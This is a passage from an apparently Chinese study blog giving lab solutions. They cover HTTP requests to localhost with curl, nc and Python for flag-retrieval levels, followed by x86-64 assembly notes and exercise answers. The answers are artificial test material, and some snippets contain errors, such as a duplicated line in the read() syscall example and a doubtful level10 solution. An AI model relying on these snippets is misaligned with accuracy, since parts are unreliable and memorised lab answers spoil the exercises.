<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/29b2f212%20ac7dee8c/6326b468%206cb1da77"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level13：利用<code>curl</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1?a=5d4ed57dc4ed9b68aaac7deda7cd9a27</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level14：利用<code>nc</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=0e25a7e3d8077f06dc35a1823aeaa569</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意这里query的内容直接在GET后面，而不是存在于标头的其他字段中</p></li>
<li><p>level15：利用<code>python</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag =requests.get(<span class="string">"http://127.0.0.1?a=afab141c4a9e843db55e4a81816602d1"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level16：利用<code>curl</code>实现包含多个参数的http请求，注意题目给出的参数值可能包含空格和特殊字符，需要先用URL编码后再运行，wp如下：(注意这里需要加引号，不然<code>&amp;</code>会被shell解析，而不是被curl解析)</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl "127.0.0.1/?a=b8dbc24d45679b6e349122d71ea38e70&amp;b=aede2913%204570a</span><br><span class="line"><span class="meta prompt_">124%</span><span class="language-bash">26859cbce2%23d6a8532c<span class="string">"</span></span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level17：利用<code>nc</code>实现包含多个参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=f4795b314fa022d21753a3ccdc037396&amp;b=19e098b0%20c1e3ffc6%260ea9c1d8%2353e69e00</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level18：利用<code>python</code>实现包含多个参数的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/?a=1dc9ca4ec624516c5f17232cccf1290e&amp;b=deaaa58c%20ea168caa%26ba7e648d%23f1322933"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level19：利用<code>curl</code>实现包含表单数据的http请求，使用<code>-d</code>参数可以指定<strong>POST</strong>请求的数据，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d "a=9a3879fa28637bf12b9eae87317f6f09" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level20：利用<code>nc</code>实现包含表单数据的http请求，wp如下：（<code>Content-Type</code>和<code>Content-Length</code>是必须存在的字段，否则报错）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 34\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=75236b164f727c132ec2d3c19b1db9da" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>这里<code>-e</code>告诉<code>echo</code>命令对特殊字符进行解释（例如<code>\r</code>,<code>\n</code>），<code>|</code>管道符将一个命令的输出传递给另一个命令的输入，<code>\r\n</code>
的组合用于表示一个换行操作。<code>\r</code> 表示回车符，而
<code>\n</code> 表示换行符。</p>
<blockquote>
<p>在早期的打字机和计算机系统中，回车和换行是两个不同的操作。回车是将打印头移动到行的开头，而换行是将纸张（或屏幕）上的滚动到下一行的开头。因此，回车和换行两者通常一起使用，以便在文本中创建新的行。</p>
<p>在ASCII和类似的字符编码标准中，回车符被编码为十进制值13，通常表示为
<code>\r</code>。换行符被编码为十进制值10，通常表示为
<code>\n</code>。</p>
<p>不同的操作系统采用了不同的惯例来表示换行。例如：</p>
<ul>
<li>在早期的Macintosh系统中，换行符为回车符。</li>
<li>在Unix和类Unix系统中，换行符为换行符（LF，Line Feed）。</li>
<li>在早期的微软DOS和Windows系统中，换行符由回车加换行（<strong>CRLF</strong>，Carriage
Return + Line Feed）组成。</li>
</ul>
</blockquote>
<ul>
<li><p>level21：利用<code>python</code>实现包含表单数据的http请求，wp如下：(使用<code>post</code>方法)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a758fc5442beded11613c025389e9e24"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level22：利用<code>curl</code>实现包含多个表单数据的http请求，wp如下：</p>
<p>同leve19</p></li>
<li><p>level23：利用<code>nc</code>实现包含多个表单数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 78\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=02e05707979b92341471a4754f7237ae&amp;b=fddf3ce0%20c765b9f1%269d251f3c%23552a07ba" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level24：利用<code>python</code>实现包含多个表单数据的http请求，wp如下：(注意这里可以不用对数据使用URL编码)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a07ff34cf5dea70e6e31c83edb478217"</span>,<span class="string">"b"</span>:<span class="string">"6a5a088f 3218da24&amp;59d6fbf5#6ed02d14"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level25：利用<code>curl</code>实现包含json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d '{"a":"8638b985e542e67fb7b37160002dbe68"}' -H 'Content-Type:application/json' 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level26：利用<code>nc</code>实现包含json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e 'POST / HTTP/1.1\r\nContent-Length: 40\r\nContent-Type: application/json\r\n\r\n{"a":"4d2c1a100629302982b1e18109ec7a71"}' | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure>
<p>注意：<code>Content-Length</code>的数值是<code>{"a":"4d2c1a100629302982b1e18109ec7a71"}</code>中所有字符数</p></li>
<li><p>level27：利用<code>python</code>实现包含json数据的http请求</p>
<p>使用<code>requests</code>库的<code>post</code>方法：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data={key: value}, json={key: value}, args)</span><br></pre></td></tr></tbody></table></figure>
<p>wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json={<span class="string">"a"</span>:<span class="string">"0f7e756c8025195bdcea9ad27f654aa5"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level28：利用<code>curl</code>实现包含复杂json数据的http请求，wp如下：（注意json格式中数据不用转为URL编码）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">'{"a":"c0bdab515fee54f5e283f6d3c463114e", "b":{"c":"34045ace","d":["c980a47e","49791158 3a2d4d50&amp;af0e06be#7775e47c"]}}'</span> -H <span class="string">'Content-Type: application/json'</span> 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>json格式的正确性可用https://www.json.cn/网站进行检查</p>
</blockquote></li>
<li><p>level29：利用<code>nc</code>实现包含复杂json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">'POST / HTTP/1.1\r\nContent-Length: 122\r\nContent-Type: application/json\r\n\r\n{"a": "5b0edfe197f11902659671d4a8bbb45f","b": {"c": "d2452133", "d": ["213ad821","0d8a195a be586677&amp;df1106fc#cf339e36"]}}'</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level30：利用<code>python</code>实现包含复杂json数据的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">j = {</span><br><span class="line">    <span class="string">"a"</span>: <span class="string">"873f59825939afc43a5e88b01fa27462"</span>,</span><br><span class="line">    <span class="string">"b"</span>: {</span><br><span class="line">        <span class="string">"c"</span>: <span class="string">"5aa799e9"</span>,</span><br><span class="line">        <span class="string">"d"</span>: [</span><br><span class="line">            <span class="string">"60f6eca5"</span>,</span><br><span class="line">            <span class="string">"9d1c3fbe fc5003e0&amp;ec2fea1e#78755a76"</span></span><br><span class="line">        	 ]</span><br><span class="line">    	 }</span><br><span class="line">	}</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json = j)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level31：利用<code>curl</code>实现重定向的http请求，wp如下：</p>
<p>使用<code>-L</code>参数让 HTTP 请求跟随服务器的重定向</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level32：利用<code>nc</code>实现重定向的http请求，wp如下：</p>
<p>首先直接使用nc连接目标主机，然后发送GET请求，返回重定向后的新地址，然后再次发送GET请求，此时包含新地址：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /4dfeaa067729634146f8c739a0b7dbf8</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level33：利用<code>python</code>实现重定向的http请求，wp如下：（使用<code>allow_redirects</code>参数，<code>allow_redirects</code>默认是<code>True</code>,所以是默认跳转）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level34：利用<code>curl</code>实现包含cookie的http请求，wp如下：</p>
<p>首先通过<code>-I</code>获取http请求后<strong>服务器回应的http标头</strong>，查看服务器响应标头中的<code>Set-Cookie</code>字段，然后通过利用curl的<code>-b</code>参数实现cookie的设置：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -I 127.0.0.1</span><br><span class="line">curl -b "cookie=6c1ffe56054ed15c8f8bf71124c77835" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><strong><code>Set-Cookie</code></strong> HTTP 响应标头用于将 cookie
由服务器发送到用户代理，以便用户代理在后续的请求中可以将其发送回服务器</p>
</blockquote></li>
<li><p>level35：利用<code>nc</code>实现包含cookie的http请求，wp如下：</p>
<p>步骤类似于level34，首先获取服务器返回的<code>Set-Cookie</code>字段，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80 (获取cookie)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level36：利用<code>python</code>实现包含cookie的http请求，wp如下：</p>
<p>这题我直接使用<code>print(requests.get("http://127.0.0.1").text)</code>就获得了flag，应该是服务器出问题了？正确答案如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">cookies = {<span class="string">'cookie_name'</span>: <span class="string">'cookie_value'</span>}</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level37：利用<code>curl</code>实现有状态的http请求（session），wp如下：(使用<code>-i</code>和<code>-b</code>参数)</p>
<p>首先获取第一个状态：（一定要使用<code>-i</code>而不是<code>-I</code>，<code>-i</code>会多输出网页源码即包含flag）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -i 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure>
<p>上面命令收到服务器回应后，<strong>先输出服务器回应的标头，然后空一行，再输出网页的源码</strong>。然后根据服务器返回的Cookie值进行下面的操作：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -b <span class="string">"session=eyJzdGF0ZSI6M30.Zh456A.oCLZ7Z63NHkFLh_USfmTWOANOIA"</span> -i 127.0.0.1 （重复该操作，注意修改sessionID）</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>知识点：cookie中可包含sessionID，发送给服务器</p>
</blockquote></li>
<li><p>level38：利用<code>nc</code>实现有状态的http请求（session），wp如下：</p>
<p>先获取第一个sessionID：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后重复下面操作，注意每次修改sessionID：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level39：利用<code>python</code>实现有状态的http请求（session），wp如下：</p>
<p>同level36，题目有问题</p></li>
</ul>
<h2 id="assembly-crush-course">Assembly Crush Course</h2>
<h3 id="知识点-1">知识点</h3>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181839763.png"></p>
<ul>
<li><p>寄存器：al、ah——8位，ax——16位，eax——32位，rax——64位</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181827025.png"></p></li>
<li><p>汇编指令：</p>
<p>赋值：<code>mov rax, 0x538</code>，将 0x538 存到 rax 中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -1</span><br><span class="line">movsx rax, eax   # movsx会进行符号扩展，保持原符号</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>进程：虚拟内存空间</p>
<p>栈顶在低地址，栈底在高地址</p></li>
<li><p>内存地址：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x13337</span><br><span class="line">mov [rax], rbx       # 将rbx中的值赋给地址为0x13337的内存</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>小端序</p></li>
<li><p><code>LEA</code>（Load Effective
Address）指令是x86汇编语言中的一种指令，用于将一个有效地址加载到一个寄存器中，例如</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rax, [rbx]     # 方括号内的内容会被解释为内存地址</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>rsp</code>栈顶指针</p></li>
<li><p><code>rip</code>指向下一个指令，即下一个指令的地址</p></li>
<li><p>设置立即数的<strong>位数</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov DWORD PTR [rax], 0x1337     # 0x1337是32位（两个字-四个字节）</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>立即数 0x1337 存储到寄存器 rax
所指向的内存地址中。这个指令的作用是将十六进制数 0x1337 写入到 rax
寄存器所指向的内存地址中，存储的数据长度为 4 字节（DWORD）。</p>
</blockquote></li>
<li><p>有条件跳转</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192154038.png"></p></li>
<li><p>标志寄存器：</p>
<ul>
<li><strong>零标志 ZF</strong>=1 表示结果为 0</li>
<li><strong>溢出标志 OF</strong>=1
表示<strong>有符号</strong>整数运算溢出</li>
<li><strong>符号标志 SF</strong>
表示<strong>有符号</strong>整数运算结果的符号</li>
<li><strong>进/借位标志 CF</strong>
表示<strong>无符号</strong>整数运算的进/借位</li>
</ul></li>
<li><p><code>call</code> + 函数名</p></li>
<li><p>函数中的参数——被调用者：rdi、rsi、rdx、rcx、r8、r9等寄存器，<strong>返回值</strong>存放在rax中</p></li>
<li><p><strong>系统调用</strong>（System
Call）：<code>syscall</code>会执行<code>rax</code>存放的数字对应的系统调用，rdi、rsi、rdx、r10、r8、r9用于存放系统调用的参数</p>
<p>例：<code>n = read(0, buf, 100);</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0 # the stdin file descriptor</span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rax, 0 # system call number of read()</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure>
<p>例：<code>open()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192217413.png"></p>
<p>例：<code>exit()</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 42 # our program's return code (e.g.. for bash scripts )</span><br><span class="line">mov rax, 60 # system call number of exit( )</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>在汇编代码前加上<code>. intel_syntax noprefix</code>表示Intel汇编语法</p></li>
<li><p>汇编程序：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 42</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure>
<p>汇编程序-&gt;可执行文件：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -nostdlib -o quitter quitter.s</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<ul>
<li><p><code>-nostdlib</code>：告诉编译器不使用标准库。标准库包含了C语言中常用的函数和宏定义，但在一些特殊的情况下，比如在编写汇编程序时，我们可能不希望链接标准库。</p></li>
<li><p><code>-o quitter</code>：指定输出文件的名称为
<code>quitter</code>，这个名称可以根据你的需要进行更改。</p></li>
</ul>
</blockquote></li>
<li><p><code>objdump</code>命令（shell）：对目标文件(obj)或可执行文件进行反汇编</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -d quitter</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>大写的 <code>-M</code> 选项，如
<code>-M intel</code>，用于指定<strong>指令集的风格</strong>而不是机器架构</p>
<p>小写的<code>-m</code> 选项用于指定机器架构</p>
<p><code>-d</code>：从objfile中对机器指令进行反汇编。本选项只对那些包含指令的section进行反汇编</p>
</blockquote></li>
<li><p><code>objcopy</code>：将一个目标文件的内容拷贝到另外一个目标文件当中</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy --dump-section .text=quitter_binary_code quitter</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<ul>
<li><code>--dump-section .text=quitter_binary_code</code>：指定将
<code>.text</code> 节的内容提取出来，并将其保存到名为
<code>quitter_binary_code</code> 的文件中。<code>.text</code>
节通常包含程序的机器码指令。</li>
<li><code>quitter</code>：指定要处理的输入文件，即要从中提取内容的可执行文件。</li>
</ul>
</blockquote></li>
</ul>
<h3 id="练习-1">练习</h3>
<ul>
<li><p>level1：<code>mov</code>，给寄存器赋值</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0x1337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：无</p></li>
<li><p>level3：<code>add</code>加法</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rdi, 0x331337</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：<code>imul</code>乘法，计算f(x) = mx +
b，结果存在rax中，其中 m = rdi，x = rsi，b = rdx</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  imul rdi, rsi</span><br><span class="line">  add rdi, rdx</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：<code>div</code>除法，只有一个操作数，可以进行128位被除数除以64位除数，并且存储商和余数，其中商存储在<code>rax</code>中，余数存储在<code>rdx</code>中，步骤如下：</p>
<p>rax = rdx:rax / reg rdx = remainder</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi #rax为低64位</span><br><span class="line">div rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level6：取余，将余数存入<code>rax</code>中</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi</span><br><span class="line">div rsi</span><br><span class="line">mov rax, rdx</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level8：rax = rdi % 256，rbx = rsi % 65536
，只使用<code>mov</code>指令（模运算mod，取低位）</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, dil  # 低8位</span><br><span class="line">mov bx, si   # 低16位</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level9：使用左移<code>shl</code>，右移<code>shr</code>，为rax赋值</p>
<p>rdi = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |</p>
<p>目标：rax = B4</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shl rdi, 24  # 左移24位，得到 B4B3B2B1B0000000</span><br><span class="line">shr rdi, 56  # 右移56位，得到 00000000000000B4，即B4</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level10：按位与<code>and</code></p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and rdi, rsi</span><br><span class="line">and rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level11：or、and、xor。若x（rdi）为偶数，则y（rax）为1，否则为0</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0  #先将y置为0</span><br><span class="line">or rax, 0x1 #将y的最低位 置为1</span><br><span class="line">and rdi, 0x1 #保留x的最低位</span><br><span class="line">xor rax, rdi #异或，若x最低位为0，则y为1，否则为0</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level14：内存读写。将指定内存中的数据存放到 rax
中，在将内存中的数据进行加法操作</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [0x404000]  #先将数据存入rax中</span><br><span class="line">add rax, 0x1337      #对rax进行加法（不能对内存进行加法操作）</span><br><span class="line">mov [0x404000], rax  #写回内存</span><br><span class="line">sub rax, 0x1337      #复原rax中的数据</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level16：获取不同位数的内存数据</p>
<blockquote>
<pre><code>Quad Word   = 8 bytes = 64 bits
Double Word = 4 bytes = 32 bits
Word        = 2 bytes = 16 bits
Byte        = 1 byte  = 8 bits</code></pre>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al, [0x404000]</span><br><span class="line">mov bx, [0x404000]</span><br><span class="line">mov ecx, [0x404000]</span><br><span class="line">mov rdx, [0x404000]</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level17：为 [rdi] 和 [rsi]
内存赋值。（不能直接对内存数据进行立即数的相关操作）</p>
<p>利用寄存器作为中转，先将数据存入寄存器，然后将寄存器中的数据存入内存</p>
